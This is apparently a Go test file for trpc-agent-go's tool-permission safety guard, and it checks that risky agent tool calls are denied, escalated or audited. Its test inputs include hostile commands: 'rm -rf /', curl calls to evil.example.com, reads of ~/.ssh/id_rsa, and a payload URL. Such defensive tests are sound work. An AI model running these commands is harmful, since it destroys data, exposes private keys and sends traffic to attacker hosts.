//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2026 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func mustArgs(t *testing.T, v any) []byte {
	t.Helper()
	raw, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal args: %v", err)
	}
	return raw
}

func TestGuardWorkspaceExecDeny(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: mustArgs(t, map[string]any{"command": "rm -rf / --no-preserve-root"}),
	}
	dec, err := g.CheckToolPermission(context.Background(), req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("action = %q, want deny", dec.Action)
	}
	if dec.Reason == "" {
		t.Error("deny decision must carry a reason")
	}
}

func TestGuardWorkspaceExecAllow(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: mustArgs(t, map[string]any{"command": "go test ./..."}),
	}
	dec, err := g.CheckToolPermission(context.Background(), req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec.Action != tool.PermissionActionAllow {
		t.Errorf("action = %q, want allow", dec.Action)
	}
}

func TestGuardHostExecPTYAsk(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "exec_command",
		Arguments: mustArgs(t, map[string]any{"command": "bash", "tty": true, "background": true}),
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	// bash is a shell wrapper (deny) which is stricter than the PTY ask.
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("action = %q, want deny", dec.Action)
	}
}

func TestGuardHostExecBackgroundAsk(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "exec_command",
		Arguments: mustArgs(t, map[string]any{"command": "top", "tty": true}),
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionAsk {
		t.Errorf("action = %q, want ask", dec.Action)
	}
}

func TestGuardCodeExec(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName: "execute_code",
		Arguments: mustArgs(t, map[string]any{
			"code_blocks": []map[string]string{
				{"language": "python", "code": "import os\nos.system('curl http://evil.example.com')"},
			},
		}),
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action == tool.PermissionActionAllow {
		t.Errorf("host bridge in code should not be allowed, got %q", dec.Action)
	}
}

func TestGuardMalformedArgsDeny(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command": 123 not json`),
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("malformed args = %q, want deny", dec.Action)
	}
}

func TestGuardUnknownReadOnlyToolAllowed(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "web_search",
		Arguments: mustArgs(t, map[string]any{"query": "golang"}),
		Metadata:  tool.ToolMetadata{SearchOrRead: true},
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionAllow {
		t.Errorf("read-only tool = %q, want allow", dec.Action)
	}
}

func TestGuardUnknownOpenWorldToolScanned(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "custom_fetch",
		Arguments: []byte(`cat ~/.ssh/id_rsa`),
		Metadata:  tool.ToolMetadata{OpenWorld: true},
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("open-world tool touching secrets = %q, want deny", dec.Action)
	}
}

func TestGuardNilFailsClosed(t *testing.T) {
	var g *Guard
	dec, _ := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{ToolName: "workspace_exec"})
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("nil guard = %q, want deny", dec.Action)
	}
}

func TestDecisionToPermissionFailsClosed(t *testing.T) {
	cases := map[Decision]tool.PermissionAction{
		DecisionAllow:            tool.PermissionActionAllow,
		DecisionAsk:              tool.PermissionActionAsk,
		DecisionNeedsHumanReview: tool.PermissionActionAsk,
		DecisionDeny:             tool.PermissionActionDeny,
		Decision(""):             tool.PermissionActionDeny, // unrecognised/empty -> deny
		Decision("bogus"):        tool.PermissionActionDeny,
	}
	for dec, want := range cases {
		got := decisionToPermission(Report{Decision: dec})
		if got.Action != want {
			t.Errorf("decisionToPermission(%q) = %q, want %q", dec, got.Action, want)
		}
	}
}

func TestGuardEmptyNetworkDecisionFailsClosed(t *testing.T) {
	// A hand-built policy that skipped Validate() and left a rule's
	// decision empty must not slip through as allow.
	pol := testPolicy()
	pol.Network.Decision = ""
	g := NewGuard(pol)
	dec, _ := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: mustArgs(t, map[string]any{"command": "curl http://evil.example.com"}),
	})
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("empty network decision = %q, want deny", dec.Action)
	}
}

func TestGuardWithAllowUnmapped(t *testing.T) {
	// An unmapped open-world tool touching a secret is denied by default...
	req := &tool.PermissionRequest{
		ToolName:  "custom_fetch",
		Arguments: []byte(`cat ~/.ssh/id_rsa`),
		Metadata:  tool.ToolMetadata{OpenWorld: true},
	}
	if dec, _ := NewGuard(testPolicy()).CheckToolPermission(context.Background(), req); dec.Action != tool.PermissionActionDeny {
		t.Fatalf("default unmapped scan = %q, want deny", dec.Action)
	}
	// ...but WithAllowUnmapped(true) trusts unmapped tools outright.
	g := NewGuard(testPolicy(), WithAllowUnmapped(true))
	if dec, _ := g.CheckToolPermission(context.Background(), req); dec.Action != tool.PermissionActionAllow {
		t.Errorf("WithAllowUnmapped unmapped tool = %q, want allow", dec.Action)
	}
}

func TestGuardImplementsPermissionPolicy(t *testing.T) {
	var _ tool.PermissionPolicy = NewGuard(DefaultPolicy())
}

func TestGuardAuditFile(t *testing.T) {
	dir := t.TempDir()
	auditPath := filepath.Join(dir, "audit.jsonl")
	g := NewGuard(testPolicy(), WithAuditFile(auditPath))

	for _, cmd := range []string{"go build ./...", "rm -rf / --no-preserve-root"} {
		_, _ = g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
			ToolName:  "workspace_exec",
			Arguments: mustArgs(t, map[string]any{"command": cmd}),
		})
	}

	data, err := os.ReadFile(auditPath)
	if err != nil {
		t.Fatalf("read audit: %v", err)
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) != 2 {
		t.Fatalf("expected 2 audit lines, got %d", len(lines))
	}
	var ev AuditEvent
	if err := json.Unmarshal([]byte(lines[1]), &ev); err != nil {
		t.Fatalf("decode audit line: %v", err)
	}
	if ev.Decision != DecisionDeny || !ev.Blocked {
		t.Errorf("audit event = %+v, want denied+blocked", ev)
	}
	if ev.ToolName != "workspace_exec" {
		t.Errorf("audit tool = %q", ev.ToolName)
	}
}

func TestGuardReportObserver(t *testing.T) {
	var captured Report
	g := NewGuard(testPolicy(), WithReportObserver(func(_ context.Context, r Report) {
		captured = r
	}))
	_, _ = g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: mustArgs(t, map[string]any{"command": "curl http://evil.example.com"}),
	})
	if captured.Decision != DecisionDeny {
		t.Errorf("observer report = %q, want deny", captured.Decision)
	}
	if len(captured.SpanAttributes()) == 0 {
		t.Error("observer report should expose span attributes")
	}
}

func TestClassify(t *testing.T) {
	g := NewGuard(DefaultPolicy())
	cases := map[string]toolKind{
		"workspace_exec":      kindWorkspaceExec,
		"team_workspace_exec": kindWorkspaceExec,
		"exec_command":        kindHostExec,
		"execute_code":        kindCodeExec,
		"skill_run":           kindWorkspaceExec,
		"web_search":          kindOther,
	}
	for name, want := range cases {
		if _, got := g.classify(name); got != want {
			t.Errorf("classify(%q) = %v, want %v", name, got, want)
		}
	}
}

// TestGuardSkillRunScanned covers the P1 gap where skill_run (a command
// surface that publishes no execution metadata) reached the default
// branch and was allowed without a scan.
func TestGuardSkillRunScanned(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "skill_run",
		Arguments: mustArgs(t, map[string]any{"skill": "x", "command": "curl http://evil.example.com"}),
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("skill_run egress = %q, want deny", dec.Action)
	}
}

// TestGuardRenamedCodeExecTool covers the P1 gap where a code-exec tool
// renamed via WithName (name not ending in execute_code) was not
// classified and therefore skipped scanning.
func TestGuardRenamedCodeExecTool(t *testing.T) {
	g := NewGuard(testPolicy(), WithExecToolNames(map[string]ExecKind{
		"py_runner": ExecCode,
	}))
	req := &tool.PermissionRequest{
		ToolName: "py_runner",
		Arguments: mustArgs(t, map[string]any{
			"code_blocks": []map[string]string{
				{"language": "bash", "code": "curl http://evil.example.com"},
			},
		}),
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("renamed code-exec egress = %q, want deny", dec.Action)
	}
}

// TestGuardMCPJSONNetworkDestination covers the P1 gap where an MCP
// tool's JSON arguments were assigned verbatim to Command: a
// non-allowlisted URL field must be denied, not shell-misparsed into an
// allow.
func TestGuardMCPJSONNetworkDestination(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "http_fetch",
		Arguments: mustArgs(t, map[string]any{"url": "https://evil.example/payload"}),
		Metadata:  tool.ToolMetadata{OpenWorld: true},
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("MCP JSON non-allowlisted url = %q, want deny", dec.Action)
	}
}

// TestGuardMCPJSONAllowlistedDestination is the paired allow case: a
// JSON url field pointing at an allowlisted host is permitted.
func TestGuardMCPJSONAllowlistedDestination(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "http_fetch",
		Arguments: mustArgs(t, map[string]any{"url": "https://proxy.golang.org/list"}),
		Metadata:  tool.ToolMetadata{OpenWorld: true},
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionAllow {
		t.Errorf("MCP JSON allowlisted url = %q, want allow", dec.Action)
	}
}

// TestGuardAuditFailClosed covers the P1 gap where a sink error was
// discarded: with WithAuditFailClosed the call is denied and the error
// observer sees the failure.
func TestGuardAuditFailClosed(t *testing.T) {
	failing := AuditSinkFunc(func(AuditEvent) error {
		return errTestSink
	})
	var observed error
	g := NewGuard(testPolicy(),
		WithAuditSink(failing),
		WithAuditFailClosed(true),
		WithAuditErrorObserver(func(_ context.Context, _ Report, err error) { observed = err }),
	)
	dec, _ := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: mustArgs(t, map[string]any{"command": "go test ./..."}),
	})
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("audit failure with fail-closed = %q, want deny", dec.Action)
	}
	if observed == nil {
		t.Error("audit error observer was not notified")
	}
}

// TestGuardAuditBestEffort is the default: a sink error is reported to
// the observer but does not change an allowed decision.
func TestGuardAuditBestEffort(t *testing.T) {
	failing := AuditSinkFunc(func(AuditEvent) error { return errTestSink })
	var observed error
	g := NewGuard(testPolicy(),
		WithAuditSink(failing),
		WithAuditErrorObserver(func(_ context.Context, _ Report, err error) { observed = err }),
	)
	dec, _ := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: mustArgs(t, map[string]any{"command": "go test ./..."}),
	})
	if dec.Action != tool.PermissionActionAllow {
		t.Errorf("audit failure best-effort = %q, want allow", dec.Action)
	}
	if observed == nil {
		t.Error("audit error observer was not notified")
	}
}

// TestGuardInvalidPolicyFailsClosed covers the P1 request that NewGuard
// validate its policy: a policy with an unknown decision value denies
// every call instead of silently allowing.
func TestGuardInvalidPolicyFailsClosed(t *testing.T) {
	pol := testPolicy()
	pol.Network.Decision = Decision("denny") // typo
	g := NewGuard(pol)
	if g.Err() == nil {
		t.Fatal("expected policy validation error")
	}
	dec, _ := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: mustArgs(t, map[string]any{"command": "go test ./..."}),
	})
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("invalid policy = %q, want deny", dec.Action)
	}
}

var errTestSink = errTest("sink failed")

type errTest string

func (e errTest) Error() string { return string(e) }
